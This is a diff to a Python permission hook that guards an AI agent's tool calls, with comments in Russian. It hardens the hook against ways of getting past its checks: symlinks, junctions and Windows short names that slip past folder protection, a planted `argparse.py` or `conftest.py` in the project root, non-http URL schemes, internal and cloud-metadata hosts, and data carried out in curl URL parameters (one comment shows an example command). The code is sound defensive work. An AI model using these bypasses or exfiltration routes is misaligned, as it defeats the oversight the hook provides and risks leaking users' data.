@@ -62,11 +62,40 @@ def _norm(s: str) -> str:
     return re.sub(r"/+", "/", str(s).replace("\\", "/")).lower()
 
 
+_DRIVE = re.compile(r"^[a-z]:$")
+_LONG_PREFIX = re.compile(r"^(?:\\\\\?\\|//\?/)")
+
+
+def _norm_path(s: str) -> str:
+    """Путь так, как его разберёт Windows: точки и пробелы в конце имени отбрасываются (`runtime./policy.yaml` —
+    это `runtime/policy.yaml`), потоки NTFS (`file:поток`) — тоже, регистр не важен."""
+    out = []
+    for i, part in enumerate(_norm(s).split("/")):
+        if part in ("", ".", "..") or (i == 0 and _DRIVE.match(part)):
+            out.append(part)
+        else:
+            out.append(part.split(":", 1)[0].rstrip(". "))
+    return "/".join(out)
+
+
+def _with_base(path: str, base: Path) -> str:
+    p = _LONG_PREFIX.sub("", os.path.expanduser(str(path)))   # `\\?\C:\…` — тот же путь без приставки
+    return p if os.path.isabs(p) else os.path.join(str(base), p)
+
+
 def _abs(path: str, base: Path) -> str:
-    p = os.path.expanduser(str(path))
-    if not os.path.isabs(p):
-        p = os.path.join(str(base), p)
-    return _norm(os.path.normpath(p))
+    return _norm_path(os.path.normpath(_with_base(path, base)))
+
+
+def _variants(path: str, base: Path) -> list[str]:
+    """Путь как написан и его настоящее место: junction и символическая ссылка (`outbox/rt` → `runtime`) и
+    короткие имена Windows (`INTEGR~1`) раскрываются, иначе защита папок обходится ссылкой."""
+    lexical = _abs(path, base)
+    try:
+        real = _norm_path(os.path.realpath(_with_base(path, base)))
+    except (OSError, ValueError):
+        return [lexical]
+    return [lexical] if real == lexical else [lexical, real]
 
 
 def _glob_hit(abs_path: str, pattern: str, root: Path) -> bool:
@@ -109,11 +138,48 @@ def _text_mentions(text: str, patterns, root: Path) -> str | None:
 
 
 def _path_denied(value: str, patterns, root: Path, base: Path) -> str | None:
-    absolute = _abs(value, base)
-    for pat in patterns or []:
-        if _glob_hit(absolute, pat, root):
-            return pat
+    for absolute in _variants(value, base):
+        for pat in patterns or []:
+            if _glob_hit(absolute, pat, root):
+                return pat
     return _text_mentions(value, patterns, root)
+
+
+def _root_file_name(token: str, root: Path) -> str | None:
+    """Имя файла, лежащего прямо в корне проекта (`argparse.py`, `./start.bat`, `<корень>/x.py`), иначе None."""
+    t = _norm_path(token.strip())
+    root_n = _norm(os.path.normpath(str(root)))
+    if t.startswith(root_n + "/"):
+        t = t[len(root_n) + 1:]
+    t = t[2:] if t.startswith("./") else t
+    return t if t and "/" not in t and not t.startswith(("-", "$")) else None
+
+
+def _protected_root_name(name: str, policy: dict) -> str | None:
+    for pat in policy.get("protected_root_files") or []:
+        if fnmatch.fnmatchcase(name.lower(), pat.lower()):
+            return pat
+    return None
+
+
+def _root_file_target(variants: list[str], root: Path, policy: dict) -> str | None:
+    """Файл запуска в корне проекта: `python -m …` ставит корень первым в sys.path, и положенный туда
+    `argparse.py` подменил бы стандартный модуль внутри доверенного запуска; `pytest` берёт `conftest.py`,
+    а `start.bat` — это сам запуск бота."""
+    root_n = _norm(os.path.normpath(str(root)))
+    for v in variants:
+        head, _, name = v.rpartition("/")
+        if head == root_n and _protected_root_name(name, policy):
+            return name
+    return None
+
+
+def _shell_root_file(text: str, root: Path, policy: dict) -> str | None:
+    for token in re.split(r"[\s;&|()<>,\x22'`=]+", _dequote(text)):
+        name = _root_file_name(token, root)
+        if name and _protected_root_name(name, policy):
+            return name
+    return None
 
 
 def _inside(abs_path: str, root: Path) -> bool:
@@ -131,7 +197,8 @@ _SECRET_WILDCARD = re.compile(
 _WRITE_VERBS = re.compile(
     r"(?<![0-9&])>(?!&)|\b(tee|cp|mv|copy|move|ren|rename|touch|mkdir|ln|xcopy|robocopy|"
     r"set-content|add-content|out-file|copy-item|move-item|new-item|rename-item|export-\w+)\b"
-    r"|\bsed\s+-i|\bgit\s+(checkout|restore|apply|am|reset|stash|mv|clone)\b", re.IGNORECASE)
+    r"|\bsed\s+-i|\bgit\s+(checkout|restore|apply|am|reset|stash|mv|clone)\b"
+    r"|\bmklink\b|\bfsutil\b|-itemtype\s+(junction|symboliclink|hardlink)", re.IGNORECASE)
 _INTERPRETERS = re.compile(r"\b(python\w*|py|node|pwsh|powershell|perl|ruby)\b", re.IGNORECASE)
 _SAFE_SINKS = {"/dev/null", "nul", "$null", "/dev/stdout", "/dev/stderr"}
 
@@ -351,26 +418,55 @@ def _big_shell_read(command: str, policy: dict, base: Path) -> str | None:
 
 # ---------- данные в адресе запроса ----------
 
-def _url_data(tool: str, tool_input: dict, policy: dict) -> str | None:
-    """Адрес чтения несёт данные (длинные параметры или непрозрачный кусок вроде токена) →
-    причина для EXTERNAL url_data: так через «чтение страницы» нельзя вынести секрет или файл.
-    Обычные страницы, поиск, ссылки на рилсы и видео проходят свободно."""
+_PRIVATE_HOST = re.compile(r"^(10\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|0\.0\.0\.0$|fe80:|f[cd][0-9a-f]{2}:)|\.local$|\.internal$")
+
+
+def _url_problem(url: str, cfg: dict, *, scheme_check: bool) -> tuple[str, str, str] | None:
+    """(уровень, вид, причина) для адреса или None.
+
+    Схема не http/https (`file://`, `javascript:`, `chrome://`) — отказ: через «чтение страницы» можно было бы
+    открыть локальный файл. Домашняя сеть и служебные адреса облака (169.254.…) — кнопка. Данные в адресе
+    (длинные параметры или непрозрачный кусок вроде токена) — кнопка: так нельзя вынести секрет или файл."""
     from urllib.parse import urlsplit
 
+    try:
+        parts = urlsplit(url)
+    except ValueError:
+        return "EXTERNAL", "url_data", f"непонятный адрес запроса: {url[:200]}"
+    scheme = parts.scheme.lower()
+    if scheme_check and url.strip().lower() != "about:blank" and scheme not in ("http", "https"):
+        return "DENY", "url_scheme", f"адрес со схемой «{scheme or '?'}» запрещён: только http и https ({url[:120]})"
+    host = (parts.hostname or "").lower()
+    if _PRIVATE_HOST.search(host):
+        return "EXTERNAL", "local_network", f"адрес во внутренней сети: {host}"
+    max_query, max_token = int(cfg.get("max_query") or 200), int(cfg.get("max_token") or 32)
+    tail = parts.query + parts.fragment
+    opaque = re.compile(r"(?=[A-Za-z0-9+=_]*\d)(?=[A-Za-z0-9+=_]*[A-Za-z])[A-Za-z0-9+=_]{%d,}" % max_token)
+    if len(tail) > max_query or opaque.search(parts.path + "?" + tail):
+        return "EXTERNAL", "url_data", f"в адресе запроса к {parts.netloc or '?'} похоже есть данные: {url[:200]}"
+    return None
+
+
+def _url_data(tool: str, tool_input: dict, policy: dict) -> tuple[str, str, str] | None:
+    """Проверка адреса у инструментов «чтения страницы» (WebFetch, переход браузера)."""
     cfg = policy.get("url_data") or {}
     field = (cfg.get("tools") or {}).get(tool)
     url = tool_input.get(field) if field else None
     if not isinstance(url, str) or not url:
         return None
-    try:
-        parts = urlsplit(url)
-    except ValueError:
-        return f"непонятный адрес запроса: {url[:200]}"
-    max_query, max_token = int(cfg.get("max_query") or 200), int(cfg.get("max_token") or 32)
-    tail = parts.query + parts.fragment
-    opaque = re.compile(r"(?=[A-Za-z0-9+=_]*\d)(?=[A-Za-z0-9+=_]*[A-Za-z])[A-Za-z0-9+=_]{%d,}" % max_token)
-    if len(tail) > max_query or opaque.search(parts.path + "?" + tail):
-        return f"в адресе запроса к {parts.netloc or '?'} похоже есть данные: {url[:200]}"
+    return _url_problem(url, cfg, scheme_check=True)
+
+
+_URL_IN_TEXT = re.compile(r"https?://[^\s'\"<>`)]+", re.IGNORECASE)
+
+
+def _shell_url_data(command: str, policy: dict) -> tuple[str, str, str] | None:
+    """Те же проверки для адресов внутри команды (`curl 'https://x/?d=<данные>'`): раньше смотрели только WebFetch."""
+    cfg = policy.get("url_data") or {}
+    for url in _URL_IN_TEXT.findall(command):
+        problem = _url_problem(url, cfg, scheme_check=False)
+        if problem:
+            return problem
     return None
 
 
@@ -506,13 +602,16 @@ def decide(event: dict, policy: dict, root, env=None) -> Decision:
         target = tool_input.get(write_tools[tool])
         if not isinstance(target, str) or not target:
             return Decision("DENY", "deny", "нет пути записи", "malformed")
-        absolute = _abs(target, base)
+        variants = _variants(target, base)
         for pat in protected:
-            if _glob_hit(absolute, pat, root):
+            if any(_glob_hit(v, pat, root) for v in variants):
                 return Decision("DENY", "deny", f"запись в защищённое место запрещена ({target})", "protected")
-        if any(_glob_hit(absolute, pat, root) for pat in ask_paths):
+        if _root_file_target(variants, root, policy):
+            return Decision("DENY", "deny", f"файлы запуска в корне проекта защищены ({target})", "protected")
+        if any(_glob_hit(v, pat, root) for v in variants for pat in ask_paths):
             level, kind, reason = "EXTERNAL", "self_modify", _self_modify_reason(target, tool_input)
-        elif _inside(absolute, root) or any(_glob_hit(absolute, p, root) for p in policy.get("allow_write_paths") or []):
+        elif all(_inside(v, root) for v in variants) or any(
+                _glob_hit(v, p, root) for v in variants for p in policy.get("allow_write_paths") or []):
             level, kind, reason = "WRITE", "write", "запись внутри JARVIS"
         else:
             level, kind, reason = "EXTERNAL", "write_outside_root", f"запись вне папки JARVIS: {target}"
@@ -523,6 +622,8 @@ def decide(event: dict, policy: dict, root, env=None) -> Decision:
         if _text_mentions(checked, protected, root) \
                 and (_WRITE_VERBS.search(checked) or _INTERPRETERS.search(checked)):
             return Decision("DENY", "deny", "команда меняет защищённые файлы", "protected")
+        if _WRITE_VERBS.search(checked) and _shell_root_file(checked, root, policy):
+            return Decision("DENY", "deny", "команда создаёт или меняет файл запуска в корне проекта", "protected")
         level, kind, reason = "WRITE", "shell", "команда"
         changes_files = _WRITE_VERBS.search(checked) or _INTERPRETERS.search(checked)
         short = " ".join(command.split())
@@ -554,9 +655,13 @@ def decide(event: dict, policy: dict, root, env=None) -> Decision:
             level, kind, reason = "EXTERNAL", "big_read", big
     # 2в. данные в адресе «чтения» страницы — тоже кнопкой (аудит: риск выноса через WebFetch)
     if level == "READ":
-        leak = _url_data(tool, tool_input, policy)
-        if leak:
-            level, kind, reason = "EXTERNAL", "url_data", leak
+        problem = _url_data(tool, tool_input, policy)
+        if problem:
+            level, kind, reason = problem
+    elif shell and kind == "shell":
+        problem = _shell_url_data(str(tool_input.get("command") or ""), policy)
+        if problem:
+            level, kind, reason = problem
 
     # 3. правила: побеждает самый строгий уровень; правило уточняет вид при равном уровне умолчания
     from_rule = False
